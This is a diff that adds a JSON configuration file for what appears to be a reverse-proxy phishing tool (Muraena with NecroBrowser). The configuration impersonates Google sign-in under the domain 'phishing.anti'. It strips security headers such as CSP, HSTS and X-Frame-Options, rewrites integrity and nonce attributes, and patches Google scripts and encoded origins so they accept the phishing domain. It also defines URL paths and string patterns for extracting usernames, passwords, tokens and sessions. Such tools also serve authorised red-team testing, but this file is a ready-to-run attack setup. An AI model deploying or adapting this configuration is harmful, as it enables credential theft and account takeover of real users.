@@ -1,0 +1,241 @@
+{
+  "proxy": {
+    "phishing": "phishing.anti",
+    "destination": "google.com",
+
+    "listener": {
+      "ip": "0.0.0.0",
+      "port": 443,
+      "HTTPtoHTTPS": {
+        "enabled": true,
+        "HTTPport": 80
+      }
+    },
+
+    "skipContentType": [
+      "font/*",
+      "image/*"
+    ],
+    "transform": {
+      "base64": {
+        "enabled": false,
+        "padding": [
+          "=",
+          "."
+        ]
+      },
+      "request": {
+        "header": [
+          "Cookie",
+          "Referer",
+          "Origin",
+          "X-Forwarded-For"
+        ]
+      },
+      "response": {
+        "header": [
+          "Location",
+          "WWW-Authenticate",
+          "Origin",
+          "Set-Cookie",
+          "Access-Control-Allow-Origin"
+        ],
+        "custom": [
+          [
+            "integrity=\"",
+            "no-integrity=\""
+          ],
+          [
+            "nonce=\"",
+            "nononce=\""
+          ],
+          [
+            "var k=c.postMessage?c:c.document;k.postMessage",
+            "if(f.J == \"https://hangouts.phishing.anti\")return;\nvar k=c.postMessage?c:c.document;k.postMessage"
+          ],
+          [
+            "allow=\"microphone *; autoplay *\" src=\"https://hangouts.",
+            "allow=\"microphone *; autoplay *\" nosrc=\"https://hangouts."
+          ],
+          [
+            "|(google))\\.com",
+            "|(google)|(phishing))(\\.anti|\\.com)"
+          ],
+          [
+            ".google\\.(((co|com)",
+            ".(google|phishing)\\.(((co|com|anti)"
+          ],
+          [
+            ".google\\.com",
+            ".phishing\\.anti"
+          ],
+          [
+            "\\.google(rs)?\\.com",
+            "\\.(google(rs)|phishing)?\\.(com|anti)"
+          ],
+          [
+            "LCJwcHUiOiJodHRwczovL21haWwuZ29vZ2xlLmNvbS9yb2JvdHMudHh0IiwibHB1IjoiaHR0cHM6Ly9oYW5nb3V0cy5nb29nbGUuY29tL3JvYm90cy50eHQifQ",
+            "LCJwcHUiOiJodHRwczovL21haWwucGhpc2hpbmcuYW50aS9yb2JvdHMudHh0IiwibHB1IjoiaHR0cHM6Ly9oYW5nb3V0cy5waGlzaGluZy5hbnRpL3JvYm90cy50eHQifQ=="
+          ],
+          [
+            "LCJwcHUiOiJodHRwczovL2hhbmdvdXRzLmdvb2dsZS5jb20vcm9ib3RzLnR4dCIsImxwdSI6Imh0dHBzOi8vaGFuZ291dHMuZ29vZ2xlLmNvbS9yb2JvdHMudHh0In0",
+            "LCJwcHUiOiJodHRwczovL2hhbmdvdXRzLnBoaXNoaW5nLmFudGkvcm9ib3RzLnR4dCIsImxwdSI6Imh0dHBzOi8vaGFuZ291dHMucGhpc2hpbmcuYW50aS9yb2JvdHMudHh0In0="
+          ]
+        ]
+      }
+    },
+    "remove": {
+      "request": {
+        "header": [
+          "X-Forwarded-For"
+        ]
+      },
+      "response": {
+        "header": [
+          "Content-Security-Policy",
+          "Content-Security-Policy-Report-Only",
+          "Strict-Transport-Security",
+          "X-XSS-Protection",
+          "X-Content-Type-Options",
+          "X-Frame-Options",
+          "Referrer-Policy",
+          "X-Forwarded-For"
+        ]
+      }
+    },
+    "drop": [
+      {
+        "url": "/logout",
+        "redirectTo": "https://google.com"
+      }
+    ],
+    "log": {
+      "enabled": true,
+      "filePath": "muraena.log"
+    }
+  },
+  "tls": {
+    "enabled": true,
+    "expand": false,
+    "certificate": "./config/cert.pem",
+    "key": "./config/privkey.pem",
+    "root": "./config/fullchain.pem"
+  },
+  "crawler": {
+    "enabled": false,
+    "depth": 1,
+    "upto": 20,
+    "externalOriginPrefix": "www-",
+    "externalOrigins": [
+      "github.com",
+      "gsuite.google.ca",
+      "gsuite.google.co.id",
+      "gsuite.google.co.il",
+      "gsuite.google.co.in",
+      "gsuite.google.co.jp",
+      "gsuite.google.co.kr",
+      "gsuite.google.co.nz",
+      "gsuite.google.co.th",
+      "gsuite.google.co.uk",
+      "gsuite.google.com.au",
+      "gsuite.google.com.br",
+      "gsuite.google.com.eg",
+      "gsuite.google.com.hk",
+      "gsuite.google.com.mx",
+      "gsuite.google.com.my",
+      "gsuite.google.com.ph",
+      "gsuite.google.com.sg",
+      "gsuite.google.com.tr",
+      "gsuite.google.com.tw",
+      "gsuite.google.com.ua",
+      "gsuite.google.com.vn",
+      "gsuite.google.cz",
+      "gsuite.google.dk",
+      "gsuite.google.es",
+      "gsuite.google.fi",
+      "gsuite.google.fr",
+      "gsuite.google.hu",
+      "gsuite.google.ie",
+      "gsuite.google.nl",
+      "gsuite.google.no",
+      "gsuite.google.pl",
+      "gsuite.google.pt",
+      "gsuite.google.ru",
+      "gsuite.google.se",
+      "accounts.google.pl",
+      "www.googletagmanager.com",
+      "www.googletraveladservices.com",
+      "www.blog.google",
+      "www.blogger.com",
+      "www.linkedin.com",
+      "chrome-devtools-frontend.appspot.com",
+      "www.googleadservices.com",
+      "*.googleblog.com",
+      "*.g.doubleclick.net",
+      "*.gstatic.com",
+      "*.google.dk",
+      "*.google.it",
+      "*.googleusercontent.com",
+      "*.googleapis.com",
+      "*.google-analytics.com",
+      "*.youtube.com",
+      "*.google-analytics.com",
+      "*.sandbox.google.com",
+      "*.clients6.google.com"
+    ]
+  },
+  "necrobrowser": {
+    "enabled": true,
+    "endpoint": "http://127.0.0.1:8080",
+    "token": "ada9f7b8-6e6c-4884-b2a3-ea757c1eb617",
+    "profile": "gsuite",
+    "keywords": null
+  },
+  "staticServer": {
+    "enabled": false,
+    "port": 8080,
+    "localPath": "./static/",
+    "urlPath": "/evilpath/"
+  },
+  "tracking": {
+    "enabled": true,
+    "identifier": "_gat",
+    "regex": "[a-zA-Z0-9]{5}",
+    "domain": "",
+    "ipSource": "",
+    "urls": {
+      "credentials": [
+        "/signin/v2/challenge/password/empty",
+        "/_/signin/sl/challenge",
+        "/_/signin/sl/lookup"
+      ],
+      "authSession": [
+        "/mail/sw.js",
+        "/privacypolicy"
+      ]
+    },
+    "params": [
+      "login",
+      "mail",
+      "email",
+      "username",
+      "password",
+      "token",
+      "session"
+    ],
+    "patterns": [
+      {
+        "label": "Username",
+        "matching": "",
+        "start": "null%2Ctrue%5D%2C%22",
+        "end": "%22%5D\u0026bgRequest"
+      },
+      {
+        "label": "Password",
+        "matching": "",
+        "start": "%2C%5B%22",
+        "end": "%22%2C"
+      }
+    ]
+  }
+}
